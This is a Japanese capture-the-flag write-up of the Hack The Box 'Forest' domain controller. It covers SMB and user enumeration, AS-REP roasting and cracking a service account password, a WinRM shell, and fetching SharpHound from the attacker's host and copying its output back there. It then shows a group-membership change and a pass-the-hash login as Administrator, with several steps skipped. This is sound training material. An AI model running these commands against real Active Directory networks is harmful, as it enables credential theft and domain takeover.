# Forest

# 初期探索

## Nmap
```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ nmap -sC -sC 10.10.10.161         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-10 23:24 JST
Nmap scan report for 10.10.10.161
Host is up (0.48s latency).
Not shown: 989 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2025-04-10T14:31:57
|_  start_date: 2025-04-09T10:13:07
|_clock-skew: mean: 2h26m51s, deviation: 4h02m31s, median: 6m50s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-04-10T07:32:00-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Nmap done: 1 IP address (1 host up) scanned in 106.66 seconds
```

ADのドメインコントローラぽい



## SMB共有→特になし
```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ smbclient -L //10.10.10.161 -N               
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


## enum4linux

ユーザー情報の取得・共有リソースの収集・グループ情報の取得・SMBバージョンや設定の確認をする
```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ enum4linux -a -u "" -p "" 10.10.10.161
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Apr 10 23:32:01 2025

 =========================================( Target Information )=========================================
                                                                                                                         
Target ........... 10.10.10.161                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.10.161 )============================
                                                                                                                         
                                                                                                                         
[E] Can't find workgroup/domain                                                                                          
                                                                                                                         
                                                                                                                         

 ================================( Nbtstat Information for 10.10.10.161 )================================
                                                                                                                         
Looking up status of 10.10.10.161                                                                                        
No reply from 10.10.10.161

 ===================================( Session Check on 10.10.10.161 )===================================
                                                                                                                         
                                                                                                                         
[+] Server 10.10.10.161 allows sessions using username '', password ''                                                   
                                                                                                                         
                                                                                                                         
 ================================( Getting domain SID for 10.10.10.161 )================================
                                                                                                                         
Domain Name: HTB                                                                                                         
Domain Sid: S-1-5-21-3072663084-364016917-1341370565

[+] Host is part of a domain (not a workgroup)                                                                           
                                                                                                                         
                                                                                                                         
 ===================================( OS information on 10.10.10.161 )===================================
                                                                                                                         
                                                                                                                         
[E] Can't get OS info with smbclient                                                                                     
                                                                                                                         
                                                                                                                         
[+] Got OS info for 10.10.10.161 from srvinfo:                                                                           
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                   


 =======================================( Users on 10.10.10.161 )=======================================
                                                                                                                         
index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)                     
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2373 RID: 0x2582 acb: 0x00000010 Account: hackerman    Name: (null)    Desc: (null)
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010  Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003  Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005  Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009  Desc: (null)
index: 0x234e RID: 0x474 acb: 0x00000210 Account: HealthMailbox83d6781  Name: HealthMailbox-EXCH01-006  Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004  Desc: (null)
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008  Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002  Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013   Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001  Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007  Desc: (null)
index: 0x2372 RID: 0x2581 acb: 0x00000010 Account: jeeva        Name: (null)    Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration      Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}        Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant     Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox  Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft Exchange        Desc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active     Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox     Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft Exchange        Desc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft Exchange        Desc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)
index: 0x2374 RID: 0x2583 acb: 0x00000010 Account: tonee        Name: (null)    Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
user:[jeeva] rid:[0x2581]
user:[hackerman] rid:[0x2582]
user:[tonee] rid:[0x2583]

 =================================( Share Enumeration on 10.10.10.161 )=================================
                                                                                                                         
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                  

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.10.161                                                                             
                                                                                                                         
                                                                                                                         
 ============================( Password Policy Information for 10.10.10.161 )============================
                                                                                                                         
                                                                                                                         

[+] Attaching to 10.10.10.161 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.161)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HTB
        [+] Builtin

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                     
                                                                                                                         
                                                                                                                         
Password Complexity: Disabled                                                                                            
Minimum Password Length: 7


 =======================================( Groups on 10.10.10.161 )=======================================
                                                                                                                         
                                                                                                                         
[+] Getting builtin groups:                                                                                              
                                                                                                                         
group:[Account Operators] rid:[0x224]                                                                                    
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting builtin group memberships:                                                                                  
                                                                                                                         
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
```


## ASREPRoast攻撃

>ASREPRoast攻撃とは、Kerberos認証の“ある仕様”を突いたパスワードクラックテクニック。
Active Directory環境で“ある条件”が揃ってると、認証せずにハッシュが取れてクラック可能になる

## Brute force

John the Ripperでパスワードクラックする
```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Forest]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:48 DONE (2025-04-10 23:46) 0.02040g/s 83382p/s 83382c/s 83382C/s s3xirexi..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

ユーザ名 : `svc-alfresco`
パスワード : `s3rvice`

WinRMで接続

>WinRM（Windows Remote Management）とは、Windows Server の Windows PowerShell をリモートから操作する機能

# 初期侵入
```
┌──(kali㉿kali)-[~/htb/Retired_Machines/Forest]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p 's3rvice'       
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco

*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/9/2025   3:13 AM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
2d3*****************************
```

## user.txt
`2d3*****************************`


# 権限昇格

## bloodhound

>BloodHoundはグラフ理論を用いて、Active Directory環境における隠れた関係性と攻撃経路を明らかにする

https://github.com/SpecterOps/BloodHound-Legacy

```
┌──(kali㉿kali)-[~/htb/Retired_Machines]
└─$ git clone https://github.com/SpecterOps/BloodHound-Legacy.git
Cloning into 'BloodHound-Legacy'...
remote: Enumerating objects: 13086, done.
remote: Counting objects: 100% (1806/1806), done.
remote: Compressing objects: 100% (206/206), done.
remote: Total 13086 (delta 1697), reused 1600 (delta 1600), pack-reused 11280 (from 3)
Receiving objects: 100% (13086/13086), 186.80 MiB | 143.00 KiB/s, done.
Resolving deltas: 100% (9450/9450), done.
Updating files: 100% (652/652), done.
```

```
┌──(kali㉿kali)-[~/htb/Retired_Machines/BloodHound-Legacy/Collectors]
└─$ python3 -m http.server 80 --bind=10.10.14.15
Serving HTTP on 10.10.14.15 port 80 (http://10.10.14.15:80/) ...
10.10.10.161 - - [11/Apr/2025 00:31:22] "GET /SharpHound.exe HTTP/1.1" 200 -
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-WebRequest -Uri http://10.10.14.15/SharpHound.exe -UseBasicParsing -OutFile SharpHound.exe
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/9/2025   3:39 AM         770279 PowerView.ps1
-a----         4/9/2025   3:55 AM          28491 secretsdump.py
-a----        4/10/2025   8:38 AM        1046528 SharpHound.exe
```



```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ./SharpHound.exe
2025-04-10T08:39:13.2420437-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2025-04-10T08:39:13.4764167-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-04-10T08:39:13.5077158-07:00|INFORMATION|Initializing SharpHound at 8:39 AM on 4/10/2025
2025-04-10T08:39:13.7733091-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2025-04-10T08:39:13.8982984-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2025-04-10T08:39:14.4608310-07:00|INFORMATION|Beginning LDAP search for htb.local
2025-04-10T08:39:14.5857970-07:00|INFORMATION|Producer has finished, closing LDAP channel
2025-04-10T08:39:14.5857970-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2025-04-10T08:39:45.0859199-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM
2025-04-10T08:40:01.2108979-07:00|INFORMATION|Consumers finished, closing output channel
2025-04-10T08:40:01.2733955-07:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2025-04-10T08:40:01.5546654-07:00|INFORMATION|Status: 164 objects finished (+164 3.489362)/s -- Using 45 MB RAM
2025-04-10T08:40:01.5546654-07:00|INFORMATION|Enumeration finished in 00:00:47.0965134
2025-04-10T08:40:01.6640268-07:00|INFORMATION|Saving cache with stats: 121 ID to type mappings.
 120 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2025-04-10T08:40:01.6796497-07:00|INFORMATION|SharpHound Enumeration Completed at 8:40 AM on 4/10/2025! Happy Graphing!
```

```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Copy-Item -Path .\20250410084000_BloodHound.zip -Destination \\10.10.14.15/kali
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Download 20250410084000_BloodHound.zip
The term 'Download' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ Download 20250410084000_BloodHound.zip
+ ~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Download:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" svc-alfresco /add
The command completed successfully.
```


```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                           
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls


    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/23/2019   3:46 PM         770279 PowerView.ps1
-ar---        10/6/2019  12:46 PM            664 revert.ps1
-ar---        9/23/2019   3:05 PM             51 users.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> cat Desktop/root.txt
Cannot find path 'C:\Users\Administrator\Documents\Desktop\root.txt' because it does not exist.
At line:1 char:1
+ cat Desktop/root.txt
+ ~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (C:\Users\Admini...esktop\root.txt:String) [Get-Content], ItemNotFoundException
    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         4/9/2025   3:13 AM             34 root.txt


cat *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
d7a*****************************
```

root.txt
`d7a*****************************`
